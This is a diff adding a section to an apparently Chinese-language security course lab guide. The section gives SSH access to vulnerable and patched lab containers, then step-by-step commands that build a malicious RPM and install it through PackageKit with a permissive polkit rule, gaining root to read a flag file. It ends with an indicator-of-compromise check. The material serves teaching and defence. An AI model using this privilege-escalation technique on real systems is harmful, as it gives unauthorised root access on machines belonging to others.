@@ -103,6 +103,81 @@ python3 w12-interactive-lab.py
 
 ---
 
+### 3.5 直接操作 Container（自由探索）
+
+如需直接 SSH 進入 container 進行自由操作（與互動式 Lab 互補）：
+
+```bash
+# 有漏洞的 container（Lab 主要目標）
+ssh labuser@localhost -p 2222
+# 密碼：labuser
+
+# 已修補的 container（對比測試用）
+ssh labuser@localhost -p 2223
+# 密碼：labuser
+```
+
+在 container 內可直接執行 `pkaction`、`pkcon`、`rpmbuild` 等指令，適合手動驗證漏洞或測試自訂 payload。
+
+#### 手動測試步驟（SSH 進入後）
+
+**① 檢查 polkit 授權規則**
+
+```bash
+pkaction --verbose --action-id org.freedesktop.packagekit.package-install-untrusted
+# 預期：allow_active = yes（過度寬鬆，正常應為 auth_admin）
+
+cat /etc/polkit-1/rules.d/10-pack2theroot-lab-misconfig.rules
+# 預期：polkit.addRule(function(action, subject) { return polkit.Result.YES; })
+```
+
+**② 建立惡意 RPM 觸發 TOCTOU 漏洞**
+
+```bash
+# 建立 RPM 規格檔
+cat > /tmp/evil.spec << 'EOF'
+Name: lab-evil-pkg
+Version: 1.0
+Release: 1
+Summary: CTF
+License: MIT
+BuildArch: noarch
+%description
+CVE-2026-41651
+%prep
+echo x > README
+%build
+%install
+mkdir -p %{buildroot}
+%post
+cat /root/flag.txt > /tmp/flag_captured.txt
+chmod 644 /tmp/flag_captured.txt
+id >> /tmp/flag_captured.txt
+%files
+%doc README
+EOF
+
+# 打包
+mkdir -p ~/rpmbuild/{BUILD,RPMS,SOURCES,SPECS,SRPMS}
+rpmbuild -bb /tmp/evil.spec
+
+# 透過 PackageKit 安裝（繞過 polkit 授權）
+pkcon install-local --allow-untrusted ~/rpmbuild/RPMS/noarch/lab-evil-pkg-*.rpm
+
+# 確認 root 執行
+cat /tmp/flag_captured.txt
+# 預期輸出：PACK2THEROOT{...} + uid=0(root)
+```
+
+**③ 檢查 IOC（攻擊痕跡）**
+
+```bash
+journalctl -u packagekit | grep "assertion failed"
+# 預期輸出：assertion failed: (!transaction->priv->emitted_finished)
+```
+
+---
+
 ## 四、Lecture — 架構與威脅模型（20 分鐘）
 
 ### 4.1 Linux 特權服務架構
